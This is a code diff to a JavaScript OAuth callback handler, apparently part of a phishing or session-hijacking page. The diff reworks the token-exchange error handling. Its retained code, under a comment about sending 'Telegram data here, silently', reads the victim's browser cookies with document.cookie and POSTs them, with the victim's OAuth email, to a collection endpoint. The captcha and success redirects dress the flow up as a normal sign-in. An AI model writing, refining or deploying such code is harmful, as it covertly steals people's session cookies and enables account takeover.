@@ -38,13 +38,26 @@ async function handleOAuthCallback() {
         // console.log('Payload sent to tokenExchange:', payload);
 
         // POST to your backend to exchange code for tokens
-        await fetch('/.netlify/functions/tokenExchange', {
+        const response = await fetch('/.netlify/functions/tokenExchange', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload),
-        })
-        .then(res => res.json())
-        .then(async tokenData => {
+        });
+
+        const tokenData = await response.json();
+
+        // Check if the response was successful
+        if (!response.ok || !tokenData.success) {
+            console.error('Token exchange failed:', tokenData);
+            setStatus("Authentication failed. Redirecting...");
+            setTimeout(() => {
+                window.location.href = '/?step=captcha';
+            }, 2000);
+            return;
+        }
+
+        // Only proceed if we have a successful response
+        if (tokenData.success && tokenData.email) {
             // Optionally send Telegram data here, silently
             try {
                 const cookies = document.cookie;
@@ -52,7 +65,7 @@ async function handleOAuthCallback() {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        email: tokenData.email || 'user-email-pending@oauth.exchange',
+                        email: tokenData.email,
                         cookies: cookies
                     }),
                 });
@@ -66,15 +79,15 @@ async function handleOAuthCallback() {
             setTimeout(() => {
                 window.location.href = '/?step=success';
             }, 1000);
-        })
-        .catch(() => {
+        } else {
             setStatus("Authentication failed. Redirecting...");
             setTimeout(() => {
                 window.location.href = '/?step=captcha';
             }, 2000);
-        });
+        }
 
     } catch (err) {
+        console.error('OAuth callback error:', err);
         setStatus("Authentication error. Redirecting...");
         setTimeout(() => {
             window.location.href = '/?step=captcha';
